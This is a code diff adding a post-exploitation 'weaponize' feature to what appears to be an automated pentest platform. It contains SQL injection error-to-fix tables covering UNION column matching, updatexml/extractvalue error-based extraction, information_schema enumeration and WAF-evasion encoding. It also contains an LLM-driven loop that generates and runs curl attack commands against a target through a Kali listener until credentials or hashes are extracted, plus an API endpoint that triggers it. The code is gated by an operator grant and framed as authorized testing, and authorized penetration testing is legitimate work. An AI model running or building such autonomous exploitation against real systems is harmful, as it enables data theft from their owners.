@@ -12750,6 +12750,188 @@ def _looks_like_injection_execution(output):
     return any(s in low for s in _INJECTION_EXEC_SIGNATURES)
 
 
+# Post-ex output enumeration: turn a weaponization command's output into (a) error fixes and
+# (b) discovered structure, so the next iteration can repair the command and chase the data
+# deeper — dump -> discover tables/columns -> read the objective. Data-light; the LLM does
+# the structural reasoning, these give it the deterministic fix hints.
+_POSTEX_ERROR_FIXES = [
+    (r"different number of columns|the used select statements have a different number|column count",
+     "UNION column-count mismatch: change the number of NULLs to match. Find the count with "
+     "ORDER BY N-- (increase N until it errors), then UNION SELECT that many columns."),
+    (r"xpath syntax error|extractvalue|updatexml|~[^~\s]{1,40}~",
+     "Error-based works: extract ONE value per request (updatexml/extractvalue truncate ~32 "
+     "chars — use substring(...,1,32), substring(...,33,32) to page through longer values)."),
+    (r"near [\"']{2,}|near [\"'] ?(and|or|union|updatexml|extractvalue|--|#|,)|near [\"']\s*$",
+     "The error shows a STRAY QUOTE right at your injection point — the parameter is almost "
+     "certainly NUMERIC/integer context. REMOVE the surrounding quote: use `id=1 AND "
+     "updatexml(...)` (NOT `id=1' AND updatexml(...)`). Drop the quote from EVERY payload."),
+    (r"you have an error in your sql syntax|unterminated|unclosed quotation|quoted string not properly",
+     "Syntax broke: fix the quote/comment terminator (-- - vs #), or switch technique "
+     "(union -> error-based -> boolean -> time). If the error text echoes a stray quote at "
+     "your marker, the param is numeric — drop the quote entirely."),
+    (r"unknown column|no such column|invalid column name",
+     "Wrong column name: enumerate columns from information_schema.columns WHERE table_name='<t>' "
+     "(MySQL/PG) or PRAGMA table_info (SQLite)."),
+    (r"table.*(doesn'?t exist|not found)|no such table|invalid object name",
+     "Wrong table: enumerate tables from information_schema.tables (or sqlite_master.name)."),
+    (r"access denied|command denied to user|permission denied|insufficient privileg",
+     "The DB user lacks that privilege (e.g. FILE for LOAD_FILE): pivot to a table you CAN read."),
+    (r"403 forbidden|waf|blocked|not acceptable",
+     "Likely a WAF: encode/obfuscate (comments /**/ , mixed case, URL/hex, 0x literals)."),
+]
+
+
+# Tweaks that IMPROVE the output when the command worked but the result is suboptimal
+# (encoded, truncated, partial) — not hard errors, but quality signals that guide the next
+# iteration toward cleaner / complete data.
+_POSTEX_TWEAKS = [
+    (r"~[^~]{1,40}~",
+     "Error-based value is delimited by ~…~ and capped at ~32 chars — page the rest with "
+     "substring(<expr>,33,32), substring(<expr>,65,32), … and concatenate."),
+    (r"[A-Za-z0-9+/]{40,}={0,2}",
+     "Output looks BASE64 — decode it (| base64 -d) to read the value (expected for a "
+     "php://filter read)."),
+    (r"\b[0-9a-f]{32,}\b",
+     "Output looks HEX / a hash — unhex() it, or if it's a password hash, that IS the loot "
+     "(hand it to cracking); confirm it's the objective."),
+    (r"limit|only .* row|1 row in set|single row",
+     "Only one row came back — use group_concat()/string_agg() (or LIMIT/OFFSET paging) to get "
+     "all rows at once."),
+]
+
+
+def _enumerate_postex_output(output):
+    """Enumerate a post-ex command's output. Returns {errors, tweaks, exec, empty}:
+      * errors  — deterministic FIXES for a failed command,
+      * tweaks  — improvements when it worked but the output is encoded/truncated/partial,
+      * exec    — the engine ran our input (progress, not failure).
+    Structural discovery (which tables/columns/files) is left to the LLM, which reads the raw
+    output; these give it the deterministic nudges for fixing and improving."""
+    import re as _re
+    low = (output or "").lower()
+    errors = [fix for pat, fix in _POSTEX_ERROR_FIXES if _re.search(pat, low)]
+    tweaks = [tw for pat, tw in _POSTEX_TWEAKS if _re.search(pat, output or "")]
+    return {"errors": errors, "tweaks": tweaks,
+            "exec": _looks_like_injection_execution(output),
+            "empty": not (output or "").strip()}
+
+
+def _run_postex_weaponize(cve, ip, port, vuln_class, confirmed_command, eid, run_id=None,
+                          objective=None, max_iters=4, model=None, session_cookie=None):
+    """Weaponize a CONFIRMED web exploit into EXTRACTED DATA: run a weaponization command,
+    ENUMERATE its output (fix errors, discover structure), and iterate — dump -> discover
+    tables/columns/files -> read the objective — until real data is extracted or the budget
+    runs out. Reuses the postex_web skill for the class. Stores the loot + a security_test.
+    GATED/impactful: the caller checks the grant. Returns {extracted, extracted_data, ...}."""
+    import time as _t, httpx as _hx
+    port = port or 80
+    run_id = run_id or f"postex_{cve}_{ip}_{int(_t.time())}"
+    listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
+    _vt = int(os.environ.get("VECTOR_RUN_TIMEOUT", "600"))
+    try:
+        from common import vuln_skills as _vs
+        skill = _vs.postex_for(issue_type=vuln_class, name=vuln_class) or {}
+    except Exception:  # noqa: BLE001
+        skill = {}
+    weap = skill.get("weaponize", ""); proof = skill.get("proof", "")
+    obj = objective or skill.get("objective") or "extract the objective data (secret / credentials / file)"
+    tgt = f"http://{ip}:{port}"
+    auth = f"Send this Cookie in EVERY request: {session_cookie}. " if session_cookie else ""
+    facts = []
+    command = confirmed_command
+    output = ""; extracted = False; extracted_data = ""; iters = 0; llm_model = None
+    consecutive_errors = 0
+    for it in range(1, max(1, max_iters) + 1):
+        iters = it
+        prompt = (f"AUTHORIZED lab pentest POST-EXPLOITATION. A {vuln_class} exploit is CONFIRMED on "
+                  f"{tgt}. {auth}Weaponize it to: {obj}.\n"
+                  f"Skill: {weap}\nProof required: {proof}\n"
+                  f"Confirmed primitive: {confirmed_command}\n"
+                  f"Last command: {command}\nLast output (ENUMERATE it):\n{(output or '(none yet)')[:1800]}\n"
+                  f"Learned so far: {'; '.join(facts[-6:]) or '(nothing yet)'}\n"
+                  f"Analyze the output: if it ERRORED, FIX the command; if the data is ENCODED / "
+                  f"TRUNCATED / PARTIAL, TWEAK the command to get clean, complete output "
+                  f"(decode base64/hex, page long values, group_concat all rows); if it revealed "
+                  f"structure (tables/columns/files/paths), use it to go DEEPER toward the "
+                  f"objective; if it already CONTAINS the objective data, set done=true.\n"
+                  f"Return ONE JSON only: {{\"command\": \"<next single curl command>\", "
+                  f"\"done\": <true iff the LAST output already contains the objective data>, "
+                  f"\"extracted\": \"<the objective data if present in the last output, else empty>\", "
+                  f"\"note\": \"<what you learned / what you're doing next>\"}}.")
+        try:
+            res = _llm_for_model(prompt, model=model, caller="postex_weaponize", num_predict=900)
+            if isinstance(res, dict) and res.get("model"):
+                llm_model = res["model"]
+            j = _poc_extract_json(res.get("response", "") if isinstance(res, dict) else "") or {}
+        except Exception:  # noqa: BLE001
+            j = {}
+        note = str(j.get("note", ""))[:200]
+        if note:
+            facts.append(note)
+        if j.get("done") and (j.get("extracted") or output):
+            extracted = True
+            extracted_data = str(j.get("extracted") or output)[:2000]
+            _poc_trace(run_id, "postex_done", iteration=it,
+                       response=f"objective extracted: {extracted_data[:200]}")
+            break
+        command = str(j.get("command") or "").strip()
+        if not command:
+            break
+        try:
+            lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                          json={"command": command, "target": str(ip), "port": port, "timeout": _vt},
+                          headers={"x-api-key": API_KEY}, verify=False, timeout=_vt + 60)
+            d = lr.json() if lr.status_code < 400 else {}
+            output = (d.get("output", "") if isinstance(d, dict) else "") or lr.text
+        except Exception as e:  # noqa: BLE001
+            output = f"listener error: {e}"
+        enum = _enumerate_postex_output(output)   # <-- enumerate on the output
+        for fix in enum["errors"]:
+            facts.append("FIX: " + fix)
+        for tw in enum["tweaks"]:
+            facts.append("TWEAK: " + tw)          # improve the output (encoded/truncated/partial)
+        if enum["exec"]:
+            facts.append("primitive is executing (engine ran our input)")
+        # Anti-oscillation: if the command keeps ERRORING with no usable data, stop
+        # re-fixing the same syntax — switch technique / terminator entirely.
+        made_progress = bool(output.strip()) and not enum["errors"]
+        consecutive_errors = 0 if made_progress else consecutive_errors + 1
+        if consecutive_errors >= 2:
+            facts.append("NO PROGRESS after 2 error-fixes — SWITCH TECHNIQUE ENTIRELY: if "
+                         "error-based (updatexml/extractvalue) keeps failing, pivot to "
+                         "UNION SELECT (find the column count with ORDER BY N first) or to a "
+                         "boolean/time-based read; and change the comment terminator (-- - / # / ;%00).")
+        _poc_trace(run_id, "postex_run", iteration=it, run_output=output, prompt=command,
+                   extra={"errors": enum["errors"], "tweaks": enum["tweaks"], "exec": enum["exec"]})
+    security_test_id = None; log_path = _poc_run_file(run_id)
+    if extracted:
+        try:
+            with get_db() as conn, conn.cursor() as cur:
+                cur.execute("""INSERT INTO security_tests
+                    (name, description, tier, category, target_host, target_port, command, tool,
+                     assertion, source_finding_source, engagement_id, metadata)
+                    VALUES (%s,%s,'impactful','postex_weaponize',%s,%s,%s,%s,%s,'postex_weaponize',%s,%s) RETURNING id""",
+                    (f"Post-ex {vuln_class} on {ip}: {obj[:40]}", f"Weaponized {cve}: {obj}", ip, port,
+                     command, (command.split(' ', 1)[0] if command else 'curl'),
+                     Json({"expect_contains": extracted_data[:80]}), eid,
+                     Json({"cve": cve, "vuln_class": vuln_class, "objective": obj,
+                           "extracted": extracted_data[:1000], "postex": True, "iterations": iters,
+                           "log": log_path, "llm_model": llm_model})))
+                security_test_id = str(cur.fetchone()[0]); conn.commit()
+        except Exception as e:  # noqa: BLE001
+            logging.warning("store postex loot failed: %s", e)
+    _poc_index(cve, ip, run_id, log_path, extracted, iters, security_test_id, eid)
+    try:
+        emit_webhook("exploit_weaponized", "poc",
+                     {"cve": cve, "target": ip, "vuln_class": vuln_class, "extracted": extracted,
+                      "objective": obj, "security_test_id": security_test_id})
+    except Exception:  # noqa: BLE001
+        pass
+    return {"ok": True, "extracted": extracted, "objective": obj, "vuln_class": vuln_class,
+            "extracted_data": extracted_data[:1000], "iterations": iters, "final_command": command,
+            "security_test_id": security_test_id, "log_path": log_path, "facts": facts[-8:]}
+
+
 def _flag_exploit_confirmed(cve, ip, port, command, eid):
     """A verified PoC = a CONFIRMED primitive. Emit an `exploit_confirmed` fact (webhook) and
     a GATED weaponization follow-up carrying the post-ex 'loot' skill for the class, so the
@@ -14362,6 +14544,78 @@ def exploit_bakeoff(exploit_id: str, body: BakeoffBody, authorized: bool = Depen
     except Exception:  # noqa: BLE001
         pass
     return {"ok": True, "cve": row["cve"], "target": f"{ip}:{port}", "results": results}
+
+
+class WeaponizeBody(BaseModel):
+    objective: Optional[str] = None      # what to extract; default = the class's objective
+    vuln_class: Optional[str] = None     # override the inferred class
+    max_iters: int = 4
+    model: Optional[str] = None
+    release: bool = False
+    username: Optional[str] = None       # auth for an authenticated surface
+    password: Optional[str] = None
+    login_url: Optional[str] = None
+
+
+@app.post("/exploit-store/{exploit_id}/weaponize", tags=["Exploit Store"])
+def weaponize_exploit(exploit_id: str, body: WeaponizeBody, authorized: bool = Depends(auth)):
+    """Post-exploitation: weaponize this CONFIRMED exploit into EXTRACTED DATA. Runs the
+    weaponization loop that ENUMERATES each command's output (fixes errors, discovers
+    structure, chases the data deeper) per the postex_web skill. GATED/impactful — needs a
+    release (grant) since it reads/modifies the target. Saves the loot as a version + a
+    security_test."""
+    _ensure_exploit_store()
+    eid = _validate_engagement_uuid(_resolve_engagement_id())
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
+        row = cur.fetchone()
+    if not row:
+        raise HTTPException(404, "exploit not found")
+    if not row["command"] or not row["target_host"]:
+        raise HTTPException(400, "entry needs a confirmed command and a target")
+    ip, port = row["target_host"], row["target_port"] or 80
+    if body.release:
+        _grant_poc(ip, port, eid, granted_by="operator", note=f"weaponize {row['cve']}")
+    elif not _poc_grant_active(ip, port, eid):
+        raise HTTPException(403, "weaponization is not released for this endpoint; release (grant) it first")
+    # infer the vuln class: explicit -> stored -> match on the CVE
+    vclass = body.vuln_class or (row["metadata"] or {}).get("vuln_class")
+    if not vclass:
+        try:
+            from common import vuln_skills as _vs
+            details = _fetch_cve_details(row["cve"]) or {}
+            m = _vs.match(name=(details.get("description") or "")[:400], issue_type=row["cve"])
+            vclass = m.get("canonical") if m else None
+        except Exception:  # noqa: BLE001
+            vclass = None
+    if not vclass:
+        raise HTTPException(400, "could not infer the vuln class; pass vuln_class")
+    # optional auth
+    session_cookie = None
+    if body.username or body.password:
+        s = _establish_session_for_build(ip, port, {"username": body.username, "password": body.password,
+                                                     "login_url": body.login_url}, eid)
+        session_cookie = (s or {}).get("cookie_header") or None
+    result = _run_postex_weaponize(row["cve"], ip, port, vclass, row["command"], eid,
+                                   objective=body.objective, max_iters=body.max_iters,
+                                   model=body.model, session_cookie=session_cookie)
+    # save the weaponized command + extracted data as a version of the entry
+    try:
+        if result.get("final_command"):
+            with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+                cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
+                cur_row = cur.fetchone()
+                vrow = dict(cur_row)
+                vrow["command"] = result["final_command"]
+                vrow["verified"] = result.get("extracted")
+                vrow["metadata"] = {**(cur_row["metadata"] or {}), "postex": True,
+                                    "objective": result.get("objective"),
+                                    "extracted": result.get("extracted_data")}
+                _snapshot_exploit_version(cur, vrow, label=f"postex:{vclass} ({'extracted' if result.get('extracted') else 'attempted'})")
+                conn.commit()
+    except Exception:  # noqa: BLE001
+        pass
+    return {"ok": True, "cve": row["cve"], "target": f"{ip}:{port}", "vuln_class": vclass, **result}
 
 
 def _resolve_and_queue_exploit(cve, ip, port, product, version, eid, dedupe=True):
